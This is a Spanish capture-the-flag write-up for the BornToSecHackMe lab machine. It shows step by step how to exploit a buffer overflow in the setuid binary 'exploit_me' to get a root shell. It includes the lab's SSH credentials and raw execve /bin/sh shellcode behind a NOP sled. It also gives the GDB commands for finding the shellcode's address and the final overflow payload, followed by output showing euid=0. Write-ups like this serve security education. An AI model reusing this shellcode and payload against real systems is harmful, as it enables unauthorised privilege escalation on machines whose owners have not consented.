# Writeup 5 - Buffer Overflow + Shellcode.

## Índice:

- [¿En qué consiste este método?](#en-qué-consiste-este-método)
- [1. Acceso SSH como zaz](#1-acceso-ssh-como-zaz)
- [2. Exportar el Shellcode](#2-exportar-el-shellcode)
- [3. Localizar dirección shellcode](#3-localizar-dirección-shellcode)
- [4. Construir el payload](#4-construir-el-payload)

## ¿En qué consiste este método?

Este es el mismo binario `exploit_me` del **writeup1** pero con una técnica diferente. En lugar de `Ret2LibC` usamos un `shellcode`.

En el writeup1 sobrescribimos el `EIP` con la dirección de `system()` en la libc. Aquí inyectamos nuestro propio código máquina en una variable de entorno y redirigimos el `EIP` a esa dirección. El shellcode llama a `execve` via syscall para obtener una shell de root.

El **NOP sled** (`\x90` × 100) es un colchón de instrucciones vacías antes del shellcode. Si el `EIP` apunta a cualquier NOP deslizará la ejecución hasta el shellcode sin fallar.

### 1. Acceso SSH como zaz

Nos conectamos por ssh con el usuario `zaz`:

- Usuario: zaz
- Pasword: 646da671ca01bb5d84dbb5fb2238dc8e

```bash
ssh zaz@192.168.0.35
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@192.168.0.35's password: 
zaz@BornToSecHackMe:~$ 
```

### 2. Exportar el Shellcode

Una vez dentro exportamos el shellcode con un NOP sled como variable de entorno:
```bash
zaz@BornToSecHackMe:~$ export SHELLCODE=$(python -c "print '\x90'*100 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80'")
zaz@BornToSecHackMe:~$ 
```

### 3. Localizar dirección shellcode

Una vez exportado, arrancamos GDB para encontrar la dirección del shellcode en memoria sin el output completo. 

Abrimos GDB y usamos este truco para encontrar directamente la dirección de la variable de entorno con `getenv`:
```bash
zaz@BornToSecHackMe:~$ gdb ./exploit_me
(gdb) b main
(gdb) r test
(gdb) p (char*)getenv("SHELLCODE")
$1 = 0xbffff8aa "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v̀"
(gdb) 
```

## **Dirección del shellcode: 0xbffff8aa**

### 4. Construir el payload

Ahora salimos de `gdb` y construimos el payload con esa dirección en little endian.

El payload es idéntico al del `writeup1`: **140 bytes de padding** más la dirección del shellcode en little endian:
```text
(gdb) q
```
```bash
./exploit_me $(python -c "print 'A' * 140 + '\xaa\xf8\xff\xbf'")
```

Y ejecutamos:
```bash
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print 'A' * 140 + '\xaa\xf8\xff\xbf'")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
# whoami
root
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
# 
```
## **ROOT conseguido con shellcode. euid=0 (privilegios de root).**
